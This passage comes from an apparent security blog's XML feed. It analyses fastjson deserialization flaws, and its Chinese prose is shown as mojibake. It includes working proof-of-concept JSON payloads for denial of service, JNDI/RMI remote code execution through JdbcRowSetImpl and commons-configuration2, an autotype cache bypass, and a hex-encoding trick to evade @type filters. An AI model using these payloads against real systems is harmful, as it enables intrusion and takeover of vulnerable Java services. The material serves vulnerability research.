ÂÖ∂Ê¨°ÔºåÂú®ÂÆûÈôÖÁöÑÊµãËØï‰∏≠Âπ∂Ê≤°ÊúâÁêÜÊÉ≥‰∏≠ÁöÑÊãíÁªùÊúçÂä°ÊïàÊûúÔºå‰ΩøÁî®Â§öÁ∫øÁ®ãÂç†Áî®‰πüÂ∞±‰ªé100Â§öMÊ∂®Âà∞2.5GÁöÑÊ†∑Â≠ê„ÄÇ1234567891011121314import com.alibaba.fastjson.JSON;public class fastjsonDos implements Runnable&#123; public static void main(String[] args)&#123; new Thread(new fastjsonDos()).start(); new Thread(new fastjsonDos()).start(); new Thread(new fastjsonDos()).start(); &#125; public void run() &#123; String DEATH_STRING = "&#123;\"a\":\"\\x"; JSON.parse(DEATH_STRING); &#125;&#125; ÂêéÊù•Â≠¶‰π†Âà∞ÔºåjavaÂêØÂä®ÁöÑÊó∂ÂÄôÂèØ‰ª•ÈÄöËøá-XmxÂèÇÊï∞‰∏∫jvmËÆæÁΩÆÊúÄÂ§ßÂÜÖÂ≠òÂç†Áî®ÔºåÈªòËÆ§‰∏∫‰∏ªÊú∫ÁöÑÂõõÂàÜ‰πã‰∏Ä„ÄÇ ÂÖ∂Ê¨°JavaÁöÑOutOfMemoryErrorÊòØJVMÂÜÖÈÉ®ÁöÑÂºÇÂ∏∏ÔºåÊòØ‰∏Ä‰∏™ÂèØÊçïËé∑ÂºÇÂ∏∏ÔºåÂπ∂‰∏ç‰ºöÁõ¥Êé•ÂØºËá¥javaËøõÁ®ãË¢´KillÊéâÔºåÈ°∂Â§öÁ∫øÁ®ãÊåÇÊéâ„ÄÇ Âú®Linux‰∏ãÂΩìÂ∫îÁî®Á®ãÂ∫èÂÜÖÂ≠òË∂ÖÂá∫ÂÜÖÂ≠ò‰∏äÈôêÊó∂Ôºå‰ºöËß¶ÂèëOut Of Memory KillerÊú∫Âà∂‰ª•‰øùÊåÅÁ≥ªÁªüÁ©∫Èó¥Ê≠£Â∏∏ËøêË°åÔºåjavaÈªòËÆ§ÊúÄÂ§ß1/4Áâ©ÁêÜÂÜÖÂ≠òÂç†Áî®ÔºåËøò‰∏çÂ§™ÂÆπÊòìÂØºËá¥Á≥ªÁªüÁöÑOOM„ÄÇ ÊÄªÁöÑÊù•ËØ¥ÔºåÊºèÊ¥ûÂç±ÂÆ≥ÊúâÈôêÔºå‰ΩÜÊòØÂà©Áî®ËøáÁ®ãËøòÊòØÊå∫ÁúãÁªÜËäÇÁöÑÔºåÊúâ‰∏Ä‰∫õÂÄºÂæóÂ≠¶‰π†ÁöÑÁÇπ~ ÂèÇËÄÉÊñáÁ´†Ôºö fastjsonÊ∫êÁ†ÅËß£ÊûêÔºöJSON TokenËß£Êûê FastJsonÊãíÁªùÊúçÂä°ÊºèÊ¥ûÂàÜÊûê LinuxÂÜÖÊ†∏OOMÊú∫Âà∂ÁöÑËØ¶ÁªÜÂàÜÊûê]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastjson ÂèçÂ∫èÂàóÂåñËß¶ÂèëÊµÅÁ®ãÂàÜÊûê]]></title>
    <url>%2F2020%2F01%2F30%2Ffastjson%20%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Fastjson ÂèçÂ∫èÂàóÂåñËß¶ÂèëÊµÅÁ®ãÂàÜÊûêË∑ü‰∫ÜÂá†‰∏™‰∏âÊñπÁªÑ‰ª∂ÁªÑÂêàÂà©Áî®ÁöÑgadget chainÔºå‰∏ÄÁõ¥Ê≤°ÊúâÂéªË∑üfastjsonÂ∫ïÂ±ÇÂÆûÁé∞Ôºå‰∏çÂÖçÊúâÂæàÂ§öÁñëÈóÆ‰πãÂ§ÑÔºåËøôÈáåËÆ∞ÂΩï‰∏Ä‰∏ãÂàÜÊûê‰∏Ä‰∏ãfastjsonËß¶ÂèëÊµÅÁ®ã„ÄÇ fastjson 1.2.61 ÂèçÂ∫èÂàóÂåñÊâßË°åÊµÅÁ®ãÂàÜÊûêÊé•ÁùÄ‰∏ä‰∏ÄÁØáÊñáÁ´†fastjson 1.2.61 ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÂàÜÊûê(commons-configuration gadget)ÁöÑpocÂá∫ÂèëÔºö1234567public class exp &#123; public static void main(String[] args)&#123; String poc = "&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"; ParserConfig.global.setAutoTypeSupport(true); JSONObject exp = (JSONObject) JSON.parseObject(poc); &#125;&#125; ‰∏ãÊñ≠ÁÇπË∑üËøõPOC‰∏≠ÁöÑJSON.parseObjectÂáΩÊï∞Ôºö Ë∑üËøõparse(String text)ÂáΩÊï∞Ôºå‰∏ÄÈ°øÂ•óÂ®ÉÊìç‰Ωú(javaÁöÑÈáçËΩΩÁâπÊÄßÔºöÂÖÅËÆ∏Â≠òÂú®Áõ∏ÂêåÊñπÊ≥ïÂêçÔºå‰ΩÜ‰∏çÂêåÂèÇÊï∞‰∏™Êï∞ÂèäÁ±ªÂûã)ÈÄöËøáÈáçËΩΩÁöÑÁâπÊÄßÔºåË∞ÉÁî®‰∫Ü‰∏â‰∏™parseÂáΩÊï∞:12345678910111213141516171819// 148 public static Object parse(String text) &#123; return parse(text, DEFAULT_PARSER_FEATURE); &#125;// 179 public static Object parse(String text, int features) &#123; return parse(text, ParserConfig.getGlobalInstance(), features); &#125;// 164 public static Object parse(String text, ParserConfig config, int features) &#123; if (text == null) &#123; return null; &#125; DefaultJSONParser parser = new DefaultJSONParser(text, config, features); Object value = parser.parse(); parser.handleResovleTask(value); parser.close(); return value; &#125; Âú®DefaultJSONParserÂáΩÊï∞‰∏≠ÂàùÂßãÂåñ‰∫Ü‰∏Ä‰∫õÂèòÈáèÈÖçÁΩÆ‰ø°ÊÅØÔºåÁ°ÆËÆ§Ëµ∑ÂßãÊ†áÂøó‰Ωç‰∏∫{Ôºö Êé•ÁùÄËøõÂÖ•parser.parseÂáΩÊï∞ÔºåËß£ÊûêjsonÊµÅÁ®ã: Ë∑üËøõDefaultJSONParser.java#parseObjectÔºåÂáΩÊï∞ËæÉÈïøÔºåÊà™ÂèñÈÉ®ÂàÜÔºö123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990for (;;) &#123; lexer.skipWhitespace(); char ch = lexer.getCurrent(); if (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123; while (ch == ',') &#123; lexer.next(); lexer.skipWhitespace(); ch = lexer.getCurrent(); &#125; &#125; boolean isObjectKey = false; Object key; if (ch == '"') &#123; key = lexer.scanSymbol(symbolTable, '"'); lexer.skipWhitespace(); ch = lexer.getCurrent(); if (ch != ':') &#123; throw new JSONException("expect ':' at " + lexer.pos() + ", name " + key); &#125; &#125; else if (ch == '&#125;') &#123; lexer.next(); lexer.resetStringPosition(); lexer.nextToken(); if (!setContextFlag) &#123; if (this.context != null &amp;&amp; fieldName == this.context.fieldName &amp;&amp; object == this.context.object) &#123; context = this.context; &#125; else &#123; ParseContext contextR = setContext(object, fieldName); if (context == null) &#123; context = contextR; &#125; setContextFlag = true; &#125; &#125; return object; &#125; else if (ch == '\'') &#123; if (!lexer.isEnabled(Feature.AllowSingleQuotes)) &#123; throw new JSONException("syntax error"); &#125; key = lexer.scanSymbol(symbolTable, '\''); lexer.skipWhitespace(); ch = lexer.getCurrent(); if (ch != ':') &#123; throw new JSONException("expect ':' at " + lexer.pos()); &#125; &#125; else if (ch == EOI) &#123; throw new JSONException("syntax error"); &#125; else if (ch == ',') &#123; throw new JSONException("syntax error"); &#125; else if ((ch &gt;= '0' &amp;&amp; ch &lt;= '9') || ch == '-') &#123; lexer.resetStringPosition(); lexer.scanNumber(); try &#123; if (lexer.token() == JSONToken.LITERAL_INT) &#123; key = lexer.integerValue(); &#125; else &#123; key = lexer.decimalValue(true); &#125; if (lexer.isEnabled(Feature.NonStringKeyAsString)) &#123; key = key.toString(); &#125; &#125; catch (NumberFormatException e) &#123; throw new JSONException("parse number key error" + lexer.info()); &#125; ch = lexer.getCurrent(); if (ch != ':') &#123; throw new JSONException("parse number key error" + lexer.info()); &#125; &#125; else if (ch == '&#123;' || ch == '[') &#123; lexer.nextToken(); key = parse(); isObjectKey = true; &#125; else &#123; if (!lexer.isEnabled(Feature.AllowUnQuotedFieldNames)) &#123; throw new JSONException("syntax error"); &#125; key = lexer.scanSymbolUnQuoted(symbolTable); lexer.skipWhitespace(); ch = lexer.getCurrent(); if (ch != ':') &#123; throw new JSONException("expect ':' at " + lexer.pos() + ", actual " + ch); &#125; &#125; //... ÊÄªÁöÑÊù•ËØ¥Â∞±ÊòØ‰∏Ä‰∏™Â§ßÂæ™ÁéØÔºåÈáåËæπÂµåÂ•ó‰∫Ü‰∏ÄÂ†Üif elseÔºåÁÑ∂Âêé‰æùÊçÆÁ±ªÂûãÊù•Âà§Êñ≠ÔºåÁõ¥Âà∞Ëø≠‰ª£Âô®ÈÅçÂéÜÂÆåjsonÊï∞ÊçÆ‰∏∫Ê≠¢ÔºåÊØîÂ¶Ç‰∏ãÈù¢Ëøô‰∏™Â∞±ÊòØÊ£ÄÊµãÊï∞Â≠óÁöÑÂà§Êñ≠ÔºöÂÜçÊØîÂ¶ÇËøôÈáåÔºåÂåπÈÖçÂà∞ÂèåÂºïÂè∑ÔºåÂàôÁî®lexer.scanSymbolÂáΩÊï∞ÂéªËé∑ÂèñÂèåÂºïÂè∑‰∏≠Èó¥ÁöÑÂÄºÔºåÂπ∂ËÆæÁΩÆÈîÆÂêçÔºö ÂÜçÊù•ÁúãËøôÈáåÔºåËøõË°å‰∫ÜÁâπÊÆäÈîÆ@typeÂåπÈÖçÔºåÂπ∂‰∏î!lexer.isEnabled(Feature.DisableSpecialKeyDetect)ÈªòËÆ§‰πüÊòØtrueË∑üËøõlexer.scanSymbol(symbolTable, &#39;&quot;&#39;)ÂáΩÊï∞ÔºåÁúãÁúãÂÆÉÊòØÂ¶Ç‰ΩïËé∑ÂèñÁ±ªÂûãÂêçtypeNameÁöÑÔºåJSONLexerBase.java#scanSymbolÔºåÂêåÊ†∑ÁöÑÔºå‰πüÊòØ‰∏Ä‰∏™Ëø≠‰ª£Âà§Êñ≠ÁöÑËøáÁ®ãÔºåËøôÈáåÁúã‰∏ÄÊÆµÊØîËæÉÊúâÊÑèÊÄùÁöÑÊòØËøô‰∏ÄÊÆµ‰ª£Á†ÅÔºö123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051if (chLocal == '\\') &#123; if (!hasSpecial) &#123; hasSpecial = true; if (sp &gt;= sbuf.length) &#123; int newCapcity = sbuf.length * 2; if (sp &gt; newCapcity) &#123; newCapcity = sp; &#125; char[] newsbuf = new char[newCapcity]; System.arraycopy(sbuf, 0, newsbuf, 0, sbuf.length); sbuf = newsbuf; &#125; // text.getChars(np + 1, np + 1 + sp, sbuf, 0); // System.arraycopy(this.buf, np + 1, sbuf, 0, sp); arrayCopy(np + 1, sbuf, 0, sp); &#125; chLocal = next(); switch (chLocal) &#123; // ÁúÅÁï•Â§ßÈáècase case '\\': // 92 hash = 31 * hash + (int) '\\'; putChar('\\'); break; case 'x': char x1 = ch = next(); char x2 = ch = next(); int x_val = digits[x1] * 16 + digits[x2]; char x_char = (char) x_val; hash = 31 * hash + (int) x_char; putChar(x_char); break; case 'u': char c1 = chLocal = next(); char c2 = chLocal = next(); char c3 = chLocal = next(); char c4 = chLocal = next(); int val = Integer.parseInt(new String(new char[] &#123; c1, c2, c3, c4 &#125;), 16); hash = 31 * hash + val; putChar((char) val); break; default: this.ch = chLocal; throw new JSONException("unclosed.str.lit"); &#125; continue; &#125; ËøôÊÆµ‰ª£Á†ÅÂ§ÑÁêÜ‰∫Ü‰ª•\xÂíå\uÂºÄÂ§¥ÁöÑ16ËøõÂà∂Â≠óÁ¨¶‰∏≤Ôºå‰πüÂ∞±ÊòØËØ¥Êàë‰ª¨ÂèØ‰ª•Áî®ËøôÁßçÊñπÂºèÂéªÁºñÁ†ÅËΩ¨Êç¢typeNameÔºå‰πüÂ∞±ÊòØ@typeÁöÑvalueÁªÑ‰ª∂ÂêçÂÜçÈ™åËØÅ‰∏Ä‰∏ãËøô‰∏™ÁªìÊûúÔºåÂ∞ÜorgÁöÑoËøõË°åÁºñÁ†ÅÔºö ÂÜçËØïËØïÂ∞Ü@typeÁöÑ@ËøõË°åÁºñÁ†ÅÈÉΩÊòØÂèØË°åÁöÑ Âõ†‰∏∫Âú®Ëé∑ÂèñkeyÂÄºÊó∂Ôºå‰πüÊòØÈÄöËøálexer.scanSymbolËé∑ÂèñÁöÑ(DefaultJSONParser.java#219Ë°å) ÊâÄ‰ª•ËØ¥ÔºåÂ¶ÇÊûúÂú®ÂºÄÂèë‰ª£Á†Å‰∏≠ËøáÊª§‰∫ÜÂÖ≥ÈîÆÂ≠ó@typeÊàñËÄÖÁªÑ‰ª∂ÂêçÔºåÂèØ‰ª•Áî®Ëøô‰∏™ÊñπÊ≥ïËøõË°åÁªïËøá ÂÖ∂ÂêéÔºåÂú®ÂêÑÁßçËß£Á†ÅÊìç‰ΩúÂÆåÊàê‰πãÂêéÔºåÂú®DefaultJSONParser.java#327Ë°åÂØπÂÖ∂ËøõË°å‰∫ÜAutoTypeÊ†°È™åÔºö ParserConfig.java#checkAutoTypeÁªèËøáÈïøÂ∫¶„ÄÅÈ¢ÑÊúüclass„ÄÅÊòØÂê¶ÂºÄÂêØautotypeÁ≠âÂà§Êñ≠ÂêéÔºåËøõË°åclassNameÁöÑhashËÆ°ÁÆóÔºåÂÖàÊúâ‰∏Ä‰∏™ÁôΩÂêçÂçïÔºåÊé•ÁùÄÂà§Êñ≠ÊòØÂê¶Âú®ÈªëÂêçÂçïhashÈáå„ÄÇ ‰∏∫‰∫ÜÈò≤Ê≠¢ÂÆâÂÖ®Á†îÁ©∂ËÄÖÁ†îÁ©∂Ôºåfastjson ‰ªé1.2.42ÂºÄÂßãÔºåÂ∞ÜÊòéÊñáÁöÑÈªëÂêçÂçïÊç¢Êàê‰∫ÜÂìàÂ∏åËøáÁöÑÈªëÂêçÂçïÔºå‰∏çËøágithub‰∏äÁöÑÂ§ßÁâõfuzzÂá∫‰∫Ü‰∏Ä‰ªΩÊ∏ÖÂçïhttps://github.com/LeadroyaL/fastjson-blacklist Âú®TypeUtils.loadClassÁ¨¨‰∏â‰∏™ÂèÇÊï∞‰∏∫trueÊó∂Ôºå‰ºöÁºìÂ≠òÂà∞MappingÔºöloadClassÂáΩÊï∞ÔºåÁ¨¨‰∏âÂèÇÊï∞‰∏∫cache‰∏∫trueÊó∂ÔºåÂàômappings.put(className, clazz);ËøõË°åÁºìÂ≠ò„ÄÇTypeUtils.java#loadClass12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123; if(className == null || className.length() == 0 || className.length() &gt; 128)&#123; return null; &#125; Class&lt;?&gt; clazz = mappings.get(className); if(clazz != null)&#123; return clazz; &#125; if(className.charAt(0) == '[')&#123; Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); &#125; if(className.startsWith("L") &amp;&amp; className.endsWith(";"))&#123; String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); &#125; try&#123; if(classLoader != null)&#123; clazz = classLoader.loadClass(className); if (cache) &#123; mappings.put(className, clazz); &#125; return clazz; &#125; &#125; catch(Throwable e)&#123; e.printStackTrace(); // skip &#125; try&#123; ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader)&#123; clazz = contextClassLoader.loadClass(className); if (cache) &#123; mappings.put(className, clazz); &#125; return clazz; &#125; &#125; catch(Throwable e)&#123; // skip &#125; try&#123; clazz = Class.forName(className); if (cache) &#123; mappings.put(className, clazz); &#125; return clazz; &#125; catch(Throwable e)&#123; // skip &#125; return clazz;&#125; ËÄåÂú®TypeUtils.javaÁöÑ1105Ë°å TypeUtils.getClassFromMappingÂáΩÊï∞Ôºå‰ªémapping‰∏≠ÂèñÂá∫Á±ªÂêç„ÄÇ ÁªßÁª≠Ë∑üËøõÔºåÂú®1127Ë°åÊúâ‰∏ÄÊÆµÂØπÊú™ÂºÄÂêØautoTypeÁöÑÂ§ÑÁêÜÔºåÂèàÊòØ‰∏ÄÊÆµÈªëÁôΩÂêçÂçïÁöÑÂ§ÑÁêÜÔºö Êé•ÁùÄÂä†ËΩΩ‰∫Üorg.apache.commons.configuration2.JNDIConfigurationÊ®°ÂùóÔºöÂêåÊó∂ËøôÈáåÂà§Êñ≠‰∫ÜÂÖ∂ÊòØÂê¶ÊúâjsonTypeÔºåjsonType = visitor.hasJsonType();ÔºåÊòØfastjson‰∏≠ÂÆöÂà∂Â∫èÂàóÂåñÁöÑÁâπÊÄßÔºåÂèÇËÄÉÊñáÊ°£Fastjson ÂÆöÂà∂Â∫èÂàóÂåñÂíåFastjson JSONField‰ªãÁªç ÊåñÂùëÔºåËøôÈáåÁî®Âà∞‰∫ÜASMËØªÂÜôÂ≠óËäÇÁ†ÅÁöÑÁ±ªÂ∫ìÔºåÂèÇËÄÉÊñáÁ´†Ê∑±ÂÖ•ASMÊ∫êÁ†Å‰πãClassReader„ÄÅClassVisitor„ÄÅClassWriter„ÄÇÂêéÊù•ËøòÁúãÂà∞ÂèØ‰ª•Áî®Ê≥®Ëß£ÊúâJsonTypeÁöÑclassËøõË°ågadget chainÊûÑÈÄ†ÔºåÂÖàÊåñÂùëÔºåhttps://xz.aliyun.com/t/7107 ÁªßÁª≠ÂæÄ‰∏ãË∑üÔºåËøôÈáåÂè™Ë¶ÅÂºÄ‰∫ÜautoTypeSupportÂ∞±‰ºöÂ∞ÜÊàë‰ª¨ÁöÑclassÁºìÂ≠òËøõmapping(cacheClass‰∏∫trueÂç≥ÁºìÂ≠ò) ÊúÄÂêéËøîÂõûclass„ÄÇÈÄöËøáautotypeÁöÑÊ£ÄÊµãÔºåËøõË°åÂèçÂ∫èÂàóÂåñÊìç‰Ωú Âà∞ËøôÈáåÂü∫Êú¨‰ªéÊ∫êÁ†ÅÂØπfastjsonËß£Êûêjson„ÄÅ@typeÁâπÊÆäÁ±ªÂûãËß£Êûê„ÄÅautotypeÊ£ÄÊµãÊúâ‰∫Ü‰∏Ä‰∏™‰∫ÜËß£„ÄÇ fastjson 1.2.48 JdbcRowSetImpl gadget ÂàÜÊûê(ÁºìÂ≠òÁªïËøáautotype)pom.xmlÊ∑ªÂä†‰∏ãÈù¢ËøôÊÆµ‰ª£Á†Å123456&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.47&lt;/version&gt;&lt;/dependency&gt; poc:1234567891011import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class test &#123; public static void main(String[] args)&#123; String poc1 = "&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;"; String poc2 = "&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true&#125;"; JSON.parse(poc1); JSON.parse(poc2); &#125;&#125; ÊàñËÄÖ‰ΩøÁî®Êï∞ÁªÑÊàñËÄÖÂú®webÊúçÂä°ËøûÁª≠Âèë‰∏§‰∏™pocÂåÖÂç≥ÂèØÔºö123456789import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class test &#123; public static void main(String[] args)&#123; String poc2 = "[&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true&#125;]"; JSON.parseObject(poc2); &#125;&#125; Ë∞ÉËØïÂàÜÊûê‰∏ãÊñ≠ÁÇπÊ†πËøõÁ¨¨‰∏Ä‰∏™pocÔºö Âíå‰∏äÊñá1.2.61Ë∞ÉËØïÁöÑËøáÁ®ãÁ±ª‰ººDefaultJSONParserÂáΩÊï∞ÂàùÂßãÂåñÈÖçÁΩÆÔºåparser.parseËß£ÊûêÔºåÂÜçÂà∞parseObjectÂáΩÊï∞ÔºåËøôÈáåÁõ¥Êé•Êù•Áúãconfig.checkAutoTypeÂú®‰∏çÂºÄÂêØautotypeÁöÑÊÉÖÂÜµÔºöParserConfig.java#checkAutoType ÊúÄÂºÄÂßãËøõË°åclassÂêçÁöÑÂìàÂ∏åËøêÁÆóÔºåÁÑ∂ÂêéÊòØÂºÄÂêØautotype‰∏ãÁöÑÈªëÁôΩÂêçÂçïÊ£ÄÊµãÔºåÁÑ∂ÂêéËøòÊ≤°Âà∞ÂêéËæπÊú™ÂºÄÂêØautotypeÁöÑifÊù°‰ª∂ÈáåÔºåÂ∞±Áõ¥Êé•return‰∫Ü„ÄÇ ÂõûÂà∞DefaultJSONParser.java#parseObjectÂáΩÊï∞Ë∑üËøõdeserializer.deserialzeÂáΩÊï∞ÔºåÊ†πÊçÆvalÂ≠óÊÆµÊù•Ëé∑ÂèñobjValÔºö ÁªßÁª≠ÂæÄ‰∏ãÔºåÂú®335Ë°åËøõË°å‰∫Ü‰∏Ä‰∏™ClassÁ±ªÁöÑÂà§Êñ≠ÔºåÁÑ∂ÂêéË∞ÉÁî®typeUtils.loadClassÂáΩÊï∞Ôºö TypeUtils.java#loadClass(String className, ClassLoader classLoader)Áî®ÈáçËΩΩÁöÑÊñπÂºèÔºåÂπ∂‰∏îËÆæÁΩÆÈªòËÆ§‰∏∫trueÁöÑÁºìÂ≠òÊìç‰ΩúÔºåÊúÄÂêéÂú®TypeUtils.java#1242Ë°åÂ∞Ücom.sun.rowset.JdbcRowSetImplÂä†Âà∞mappingÁºìÂ≠ò‰∏≠Ôºö ËøôÂ∞±ÂØºËá¥‰∫ÜËß£ÊûêÁ¨¨‰∫å‰∏™pocÊó∂ÔºåÁªïËøá‰∫ÜautotypeÊ†°È™åÔºå‰ªéÁºìÂ≠òmapping‰∏≠Âä†ËΩΩÔºöÊúÄÁªàÂÆû‰æãÂåñËØ•Á±ªÔºåÂØºËá¥RCE„ÄÇ ÊúÄÂêéËøôÁØáÊñáÁ´†ÈÄöËøáfastjson1.2.61 commons-configuration gadgetÁöÑPOCÂä®ÊÄÅË∞ÉËØïÂÖ•ÊâãÔºåÂàÜÊûêfastjsonÂèçÂ∫èÂàóÂåñËß£ÊûêjsonÊµÅÁ®ãÔºåÂàÜÊûê‰∫Ü‰∏Ä‰∏ãÊ∫êÁ†ÅÁöÑ\uÂíå\xÁöÑ16ËøõÂà∂Ëß£Á†ÅÊìç‰ΩúÔºå‰ª•ÂèäÁºìÂ≠òÊú∫Âà∂„ÄÇ ÂêåÊó∂ÂàÜÊûê‰∫Ü‰∏Ä‰∏ãÂú®fastjson 1.2.48‰ª•‰∏ãTypeUtils.loadClassÁºìÂ≠òÈóÆÈ¢òÔºåÂç≥Êó†ÈúÄÂºÄautotypeÂèØ‰ª•ÂëΩ‰ª§ÊâßË°å„ÄÇ Êé•‰∏ãÊù•ÁöÑÊó∂Èó¥ÊâìÁÆóÁ†îÁ©∂‰∏Ä‰∏ãÈ´òÁâàÊú¨jdkÁªïËøáËøúÁ®ãÁ±ªÁöÑÂä†ËΩΩÈóÆÈ¢ò„ÄÇ ÂèÇËÄÉÊñáÁ´†Ôºö FastJson ÊñáÊ°£ÈìæÊé• W3Cschool:Fastjson API‰∏≠ÊñáÁâà fastjsonÊ∫êÁ†ÅËß£Êûê fastjsonÂèçÂ∫èÂàóÂåñRCEÊ†∏ÂøÉ-Âõõ‰∏™ÂÖ≥ÈîÆÁÇπÂàÜÊûê https://paper.seebug.org/994/]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastjson 1.2.61 ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÂàÜÊûê(commons-configuration gadget)]]></title>
    <url>%2F2020%2F01%2F28%2Ffastjson%201.2.61%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Âú®fastjson 1.2.61ÁöÑÁâàÊú¨‰∏≠ÔºåÂ¢ûÂä†‰∫ÜautoTypeÁöÑÂÆâÂÖ®ÁªÑ‰ª∂ÈªëÂêçÂçïcommons-configurationÔºåÊàêÂäüÁªïËøá‰∫ÜÈªëÂêçÂçïÈôêÂà∂ÔºåÂà©Áî®ÂèçÂ∫èÂàóÂåñÁâπÊÄßÈÄ†ÊàêËøúÁ®ã‰ª£Á†ÅÊâßË°åÔºåËØ•ÁªÑ‰ª∂ÊòØjavaÂ∫îÁî®Á®ãÂ∫èÁöÑÈÖçÁΩÆÁÆ°ÁêÜÁ±ªÔºåÁî®‰∫éÂçèÂä©ÁÆ°ÁêÜÂêÑÁßçÊ†ºÂºèÁöÑÈÖçÁΩÆÊñá‰ª∂„ÄÇ ÊºèÊ¥ûÂ§çÁé∞IdeaÂàõÂª∫È°πÁõÆÔºåÈÄâÊã©mavenÔºåjdkÁâàÊú¨1.8.0_73ÔºåÂú®pom.xml‰∏≠Ê∑ªÂä†Â¶Ç‰∏ã‰ª£Á†Å,Ëá™Âä®Âä†ËΩΩ‰æùËµñÔºö fastjson:1.2.60 commons-configuration2: 2.6 1234567891011121314&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.60&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-configuration2 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-configuration2&lt;/artifactId&gt; &lt;version&gt;2.6&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; ÂêåÊ†∑ÁöÑÔºåÊåâÁÖß‰∏ä‰∏ÄÁØáÊñáÁ´†ÊñáÁ´†‰∏≠ÂÜôÁöÑÔºåÊê≠Âª∫‰∏Ä‰∏™ÊÅ∂ÊÑèÁöÑRMIÊúçÂä°Ôºå‰Ωø‰πãÂä†ËΩΩ„ÄÇpoc:12345678910import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class exp &#123; public static void main(String[] args)&#123; String poc = "&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"; ParserConfig.global.setAutoTypeSupport(true); JSON.parseObject(poc); &#125;&#125; ÊºèÊ¥ûÂàÜÊûêÂú®‰∏ä‰∏ÄÁØáÊñáÁ´†‰∏≠ÂÜô‰∫ÜfastjsonÂú®ÂèçÂ∫èÂàóÂåñjsonÊï∞ÊçÆÊó∂Ôºå‰ºöËá™Âä®Ë∞ÉÁî®ÂÖ∂Â±ûÊÄßXXÁöÑsetXXÂíågetXXÊñπÊ≥ïÔºåÂ¶ÇÊûúÂÖ∂‰∏≠ÊúâJNDI ReferenceÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÂàôÂèØ‰ª•ÈÄ†ÊàêRCEÁöÑÊïàÊûú„ÄÇ Âú®‰∏ãÈù¢ËøôÊÆµ‰ª£Á†Å‰∏≠ÔºåÊàë‰ª¨ÂèØ‰ª•Áü•ÈÅìÂú®‰ΩøÁî®JSON.parseObjectÂèçÂ∫èÂàóÂåñjsonÊï∞ÊçÆÊó∂Ôºå‰ºöË∞ÉÁî®ÊâÄÊúâÂ±ûÊÄßÁöÑgetÊñπÊ≥ïÔºå‰ª•ÂèäÁõ∏ÂÖ≥Â±ûÊÄßÁöÑsetÊñπÊ≥ï„ÄÇ1234567891011121314151617181920212223242526272829303132import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;import com.alibaba.fastjson.JSONObject;public class User &#123; private int age; private String name; public int getAge() &#123; System.out.println("getAgeÊñπÊ≥ïË¢´Ëá™Âä®Ë∞ÉÁî®ÔºÅ"); return age; &#125; public void setAge(int age) &#123; System.out.println("setAgeÊñπÊ≥ïË¢´Ëá™Âä®Ë∞ÉÁî®ÔºÅ"); this.age = age; &#125; public String getName() &#123; System.out.println("getNameÊñπÊ≥ïË¢´Ëá™Âä®Ë∞ÉÁî®ÔºÅ"); return name; &#125; public void setName(String name) &#123; System.out.println("setNameÊñπÊ≥ïË¢´Ëá™Âä®Ë∞ÉÁî®ÔºÅ"); this.name = name; &#125; public static void main(String[] args) &#123; //‰ΩøÁî®@typeÊåáÂÆöËØ•JSONÂ≠óÁ¨¶‰∏≤Â∫îËØ•ËøòÂéüÊàê‰ΩïÁßçÁ±ªÂûãÁöÑÂØπË±° String userInfo = 